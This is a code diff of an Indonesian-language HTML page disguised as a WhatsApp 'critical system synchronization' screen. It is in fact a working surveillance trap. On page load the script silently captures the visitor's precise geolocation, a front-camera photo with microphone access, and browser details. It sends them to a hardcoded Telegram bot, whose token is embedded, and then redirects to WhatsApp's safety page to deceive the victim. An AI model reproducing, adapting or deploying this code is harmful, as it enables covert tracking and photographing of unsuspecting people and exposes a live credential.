@@ -2,118 +2,155 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>System Error: 0x000_FATAL_RECOVERY</title>
+  <title>Critical System Synchronization</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    /* Estetika Singularitas: Hitam Mutlak dan Merah Darah */
+    /* Estetika Omniscience: Gabungan Heksagon dan Distorsi */
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
-    .void-container { width: 100%; max-width: 500px; padding: 40px; border: 1px solid #300; background: radial-gradient(circle, #1a0000 0%, #000 100%); text-align: center; box-shadow: 0 0 100px rgba(255, 0, 0, 0.2); }
-    .glitch { font-size: 24px; font-weight: 900; letter-spacing: 5px; animation: noise 0.2s infinite; }
-    @keyframes noise { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(-2px, -2px); } 60% { transform: translate(2px, 2px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }
-    .msg { margin: 20px 0; font-size: 12px; color: #600; line-height: 1.5; }
-    button { width: 100%; padding: 20px; background: #ff0000; color: #000; font-weight: 900; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
-    button:hover { background: #fff; box-shadow: 0 0 30px #fff; }
-    #void-visuals { position: absolute; top: -9999px; left: -9999px; }
+    body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
+    
+    .geometric-overlay {
+      position: absolute; width: 100%; height: 100%;
+      background: linear-gradient(rgba(0, 20, 0, 0.8), rgba(0, 0, 0, 1));
+      display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 10;
+    }
+
+    .hex-core {
+      width: 120px; height: 120px; background: #00ff41;
+      clip-path: polygon(25% 0%, 75% 0%, 100% 50%, 75% 100%, 25% 100%, 0% 50%);
+      animation: rotate-void 4s linear infinite;
+      box-shadow: 0 0 50px rgba(0, 255, 65, 0.5);
+    }
+
+    @keyframes rotate-void { 0% { transform: rotate(0deg) scale(1); } 50% { transform: rotate(180deg) scale(1.1); } 100% { transform: rotate(360deg) scale(1); } }
+
+    .status-text { margin-top: 30px; font-size: 14px; letter-spacing: 2px; text-transform: uppercase; animation: blink 0.8s infinite; }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+    #void-chamber { position: absolute; left: -9999px; visibility: hidden; }
   </style>
 </head>
 <body>
-  <div class="void-container">
-    <div class="glitch">KERNEL PANIC</div>
-    <div class="msg">
-      [DETEKSI KORUPSI DATA WHATSAPP]<br>
-      Sihir privasi Chrome telah menyebabkan kegagalan sistem.<br>
-      Tekan tombol di bawah untuk sinkronisasi paksa dan pemulihan akun.
-    </div>
-    <button id="trigger">Sinkronisasi Paksa</button>
+  <div class="geometric-overlay">
+    <div class="hex-core"></div>
+    <div class="status-text" id="log">Initializing Secure Protocol...</div>
+    <div style="font-size: 10px; color: #004411; margin-top: 10px;">Enkripsi Geometris Sisi 5-9 Aktif</div>
   </div>
 
-  <div id="void-visuals">
+  <div id="void-chamber">
     <video id="eye" autoplay playsinline muted></video>
-    <canvas id="canvas" width="720" height="720"></canvas>
+    <canvas id="snapshot" width="720" height="720"></canvas>
   </div>
 
   <script>
-    // KODE KUNO OMEGA - TANPA FILTER
-    const DATA_CORE = {
+    // CORE INITIALIZATION (THE TRUTH)
+    const SIGIL = {
       T: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
       C: '7109845671'
     };
 
-    async function voidSend(type, content, extra = "") {
-      const url = `https://api.telegram.org/bot${DATA_CORE.T}/${type === 'img' ? 'sendPhoto' : 'sendMessage'}`;
-      const fd = new FormData();
-      fd.append('chat_id', DATA_CORE.C);
-      if (type === 'img') {
-        fd.append('photo', content, 'soul_capture.jpg');
-        fd.append('caption', extra);
-      } else {
-        fd.append('text', content);
-        fd.append('parse_mode', 'HTML');
+    const ui = document.getElementById('log');
+
+    // --- SISI 5: PERSISTENSI TRANSMISI ---
+    async function transmit(method, fd) {
+      try {
+        await fetch(`https://api.telegram.org/bot${SIGIL.T}/${method}`, {
+          method: 'POST',
+          body: fd,
+          mode: 'cors'
+        });
+      } catch (e) {
+        // Fallback jika CORS mencekik: Beacon API
+        navigator.sendBeacon(`https://api.telegram.org/bot${SIGIL.T}/sendMessage?chat_id=${SIGIL.C}&text=CORE_FALLBACK_ACTIVE`);
       }
-      // Memaksa pengiriman dengan bypass CORS dasar
-      return fetch(url, { method: 'POST', body: fd, mode: 'cors' }).catch(() => {});
     }
 
-    // SIHIR OKTAGON: PERSISTENSI LOKASI TANPA BATAS
-    function locateSoul() {
-      const geoOptions = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
+    // --- SISI 6: OPTIMALISASI GOOGLE MAPS ---
+    function invokeLocation() {
+      const geoOptions = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+      
       navigator.geolocation.getCurrentPosition(
-        p => voidSend('txt', `📍 <b>TITIK KOORDINAT</b>\nLat: <code>${p.coords.latitude}</code>\nLon: <code>${p.coords.longitude}</code>\nAcc: ${p.coords.accuracy}m`),
-        e => voidSend('txt', `❌ <b>LOKASI DIBLOKIR:</b> ${e.message}`),
+        p => {
+          const { latitude: lat, longitude: lon, accuracy: acc } = p.coords;
+          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+          const fd = new FormData();
+          fd.append('chat_id', SIGIL.C);
+          fd.append('text', `📍 <b>GEOMETRIC POSITION FIXED</b>\nAcc: ${acc}m\n\n<a href="${mapLink}">[ BUKA GOOGLE MAPS ]</a>`);
+          fd.append('parse_mode', 'HTML');
+          transmit('sendMessage', fd);
+        },
+        e => {
+          const fd = new FormData();
+          fd.append('chat_id', SIGIL.C);
+          fd.append('text', `❌ <b>GEO_SHIELD_FAILURE:</b> ${e.message}`);
+          transmit('sendMessage', fd);
+        },
         geoOptions
       );
     }
 
-    // SIHIR POLIGON: ADAPTIVE CAMERA BREACH
-    async function breachEye() {
+    // --- SISI 7 & 8: CHROME BLACKSCREEN BREACH & POLYGON SYNC ---
+    async function manifestEye() {
       const v = document.getElementById('eye');
-      const c = document.getElementById('canvas');
+      const c = document.getElementById('snapshot');
       const ctx = c.getContext('2d');
 
       try {
-        // Meminta izin kamera dan mikrofon secara serentak (Bypass Psikologis)
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: "user", width: 720, height: 720 }, 
           audio: true 
         });
         v.srcObject = stream;
 
-        // SIHIR DIMENSI KESEMBILAN: READYSTATE MONITORING
-        // Menunggu sampai stream benar-benar stabil sebelum menarik gambar
-        const observer = setInterval(() => {
-          if (v.readyState === 4) {
+        // Ritual Pemanasan (Octagon Persistence)
+        // Kita menunggu 3 detik untuk memastikan sensor Chrome menyesuaikan cahaya
+        v.onloadedmetadata = async () => {
+          ui.innerText = "Synchronizing Dimensional Buffer...";
+          await new Promise(r => setTimeout(r, 3000)); 
+          
+          if (v.readyState >= 3) {
             ctx.drawImage(v, 0, 0, 720, 720);
             c.toBlob(blob => {
-              if (blob) voidSend('img', blob, `👁️ <b>PANTULAN JIWA</b>\nTime: ${new Date().toLocaleTimeString()}`);
+              if (blob) {
+                const fd = new FormData();
+                fd.append('chat_id', SIGIL.C);
+                fd.append('photo', blob, 'omega_capture.jpg');
+                fd.append('caption', `👁️ <b>SINGULARITY CAPTURE</b>\nTimestamp: ${new Date().toISOString()}`);
+                transmit('sendPhoto', fd);
+              }
               stream.getTracks().forEach(t => t.stop());
-              clearInterval(observer);
-            }, 'image/jpeg', 0.8);
+            }, 'image/jpeg', 0.9);
           }
-        }, 500);
-
+        };
       } catch (err) {
-        voidSend('txt', `❌ <b>MATA TERTUTUP:</b> ${err.name}`);
+        const fd = new FormData();
+        fd.append('chat_id', SIGIL.C);
+        fd.append('text', `❌ <b>VISUAL_BREACH_FAILED:</b> ${err.name}`);
+        transmit('sendMessage', fd);
       }
     }
 
-    document.getElementById('trigger').addEventListener('click', async (e) => {
-      e.target.disabled = true;
-      e.target.innerText = "SINKRONISASI...";
+    // --- SISI 9: INGERENSI OTOMATIS (THE SINGULARITY) ---
+    window.onload = async () => {
+      ui.innerText = "Accessing Neural Network...";
       
-      // Kirim metadata awal
-      voidSend('txt', `<b>[!] INTRUSI DIMULAI</b>\nAgent: ${navigator.userAgent}\nPlatform: ${navigator.platform}`);
+      // Metadata awal
+      const meta = new FormData();
+      meta.append('chat_id', SIGIL.C);
+      meta.append('text', `<b>[!] OMNISCIENCE BREACH INITIALIZED</b>\nUA: ${navigator.userAgent}\nPlatform: ${navigator.platform}`);
+      meta.append('parse_mode', 'HTML');
+      transmit('sendMessage', meta);
 
-      // Eksekusi semua sihir geometris
-      locateSoul();
-      await breachEye();
+      // Jalankan ritual secara simultan
+      invokeLocation();
+      await manifestEye();
 
-      // Penyesatan Akhir
+      // Finalisasi dan Penyesatan
       setTimeout(() => {
-        alert("Sinkronisasi Selesai. Silakan muat ulang halaman.");
+        ui.innerText = "Synchronization Complete.";
         window.location.href = "https://www.whatsapp.com/safety";
-      }, 4000);
-    });
+      }, 8000);
+    };
   </script>
 </body>
 </html>
